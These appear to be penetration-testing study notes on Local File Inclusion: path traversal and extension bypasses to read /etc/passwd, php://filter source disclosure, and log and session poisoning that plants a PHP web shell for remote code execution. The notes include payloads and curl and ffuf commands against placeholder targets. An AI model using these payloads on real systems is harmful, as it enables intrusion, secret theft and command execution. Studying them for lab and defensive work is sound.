## Read vs. Execute (The Golden Rule)

Not all file inclusion functions behave the same way. It is critical to know whether the vulnerable function only **reads** text or if it actually **executes** code.

| Language   | Function               | Reads File? | Executes Code? | Allows Remote URLs? |
| ---------- | ---------------------- | ----------- | -------------- | ------------------- |
| **PHP**    | `include()`            | Yes         | Yes            | Yes                 |
| **PHP**    | `file_get_contents()`  | Yes         | No             | Yes                 |
| **NodeJS** | `fs.readFile()`        | Yes         | No             | No                  |
| **Java**   | `import`               | Yes         | Yes            | Yes                 |
| **.NET**   | `Response.WriteFile()` | Yes         | No             | No                  |

## 1. Bypassing Approved Paths

Some applications use Regular Expressions to ensure the input starts with a specific folder (e.g., `./languages/`).

- **The Logic:** The code checks if your input begins with the allowed string.
    
- **The Bypass:** Start your payload with the required path, then use **Path Traversal** (`../`) to climb back to the root directory.
    
- **Example Payload:** `?language=./languages/../../../../etc/passwd`
    
- **Pro Tip:** If there are additional filters, you can URL encode the dots/slashes or use recursive patterns (e.g., `....//`).
    

---

## 2. Bypassing Appended Extensions

Modern PHP often forces an extension like `.php` onto your input. For older systems (pre-PHP 5.5), two classic bypasses exist:

### A. Path Truncation (PHP < 5.3/5.4)

PHP used to have a 4096-character limit for file paths.

- **The Logic:** If a path is too long, PHP cuts off the end.
    
- **The Bypass:** Flood the input with repeated "current directory" markers (`/.` or `./`) until the appended extension (like `.php`) is pushed past the 4096-character mark and dropped.
    
- **Example Payload:** `?language=non_existent/../../../etc/passwd/./././.[REPEATED 2048 TIMES]`
    

### B. Null Byte Injection (PHP < 5.5)

In low-level languages like C, a Null Byte (`\0`) signals the end of a string.

- **The Logic:** PHP’s internal functions would stop reading the string as soon as they hit a Null Byte.
    
- **The Bypass:** Add `%00` to the end of your filename. The application sees `/etc/passwd%00.php`, but the operating system only tries to open `/etc/passwd`.
    
- **Example Payload:** `?language=/etc/passwd%00`

## PHP Filters

Here is the direct, command-driven breakdown of using PHP Filters for LFI source code disclosure.

## 1. The Goal: Reading PHP Source Code

When you use a standard LFI to load a `.php` file, the server executes the code instead of showing it to you. This hides the source code and often results in a blank page.

**The Solution:** Use the `php://filter` wrapper to Base64 encode the file _before_ the server can execute it.

## 2. Step 1: Fuzz for Target Files

Find hidden PHP files (like configurations) using a directory fuzzer.

_Note: Look at all status codes (200, 301, 302, 403). LFI reads files directly from the local disk, so you can often bypass web-based 403 Forbidden restrictions._

**Command:**

Bash

```
ffuf -w /path/to/wordlist.txt:FUZZ -u http://<IP>:<PORT>/FUZZ.php
```

## 3. Step 2: Inject the PHP Filter Payload

Force the application to read the file through the `convert.base64-encode` filter.

- **Syntax:** `php://filter/read=convert.base64-encode/resource=<FILENAME>`
    

**Payload Example:**

Assuming the application automatically appends `.php` to your input, you drop the extension in the `resource` parameter:

Plaintext

```
?language=php://filter/read=convert.base64-encode/resource=config
```

## 4. Step 3: Decode the Output

The web page will output a long Base64 string (the encoded file) instead of a blank page. Copy the entire string from the page source and decode it on your local machine.

**Command:**

Bash

```
echo 'PD9waHAK...[Base64_String]...KICB9Ciov' | base64 -d
```

**The Result:** You can now read the raw PHP source code in plaintext, allowing you to hunt for hardcoded credentials, API keys, or hidden application logic.

## Log Poisoning (LFI to RCE)

**Definition:** Injecting malicious PHP code into a server log file via a user-controlled input field, and then using an LFI vulnerability to include and execute that log file.

_Requirement:_ The web server user (e.g., `www-data`) must have **read privileges** over the targeted log file.

---
	
### 1. PHP Session Poisoning

**Concept:** Injecting a payload into a user-controlled parameter that gets saved in your PHP session file.

- **File Locations:** * Linux: `/var/lib/php/sessions/sess_<YOUR_PHPSESSID>`
    
    - Windows: `C:\Windows\Temp\sess_<YOUR_PHPSESSID>`
        
- **Payload:** URL-encoded basic PHP web shell.
    
    - `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` _(Decodes to: `<?php system($_GET["cmd"]); ?>`)_
        

**Execution Steps:**

1. **Identify Session ID:** Check your browser cookies for the `PHPSESSID` value (e.g., `nhhv8i...`).
    
2. **Poison the Session:** Send the payload into the parameter known to be logged (e.g., `language`).
    
    `http://<IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
    
3. **Execute via LFI:** Include your specific session file and pass the system command.
    
    `http://<IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<YOUR_PHPSESSID>&cmd=id`
    

---

### 2. Server Log Poisoning (Apache / Nginx)

**Concept:** Injecting a payload into the `User-Agent` HTTP header, which is automatically recorded in the web server's `access.log`.

- **Apache Paths:** `/var/log/apache2/access.log` (Linux) | `C:\xampp\apache\logs\access.log` (Windows)
    
    - _Note:_ Often requires higher privileges (root/adm), but common in misconfigurations.
        
- **Nginx Paths:** `/var/log/nginx/access.log` (Linux) | `C:\nginx\log\access.log` (Windows)
    
    - _Note:_ Readable by low-privileged users by default.
        

**Execution Commands (via cURL):**

1. **Create the Poisoned Header File:**
    
    Bash
    
    ```
    echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
    ```
    
2. **Poison the Log:** Send a request to the server using the poisoned header.
    
    Bash
    
    ```
    curl -s "http://<IP>:<PORT>/index.php" -H @Poison
    ```
    
3. **Execute via LFI:** Include the access log and pass the command.
    
    `http://<IP>:<PORT>/index.php?language=/var/log/nginx/access.log&cmd=id`
    

---

### 3. Alternative Log Poisoning Targets

If web logs are restricted, you can poison other services if they are exposed and you can read their logs via LFI. The method is the same: use the PHP payload as your input (e.g., as a username).

- **SSH Logs:** `/var/log/sshd.log` (Log in via SSH using `<?php...?>` as the username).
    
- **FTP Logs:** `/var/log/vsftpd.log`
    
- **Mail Logs:** `/var/log/mail`
    
- **Process Environments (Linux):** `/proc/self/environ` or `/proc/self/fd/<PID>` (Contains User-Agent data, but usually requires root).
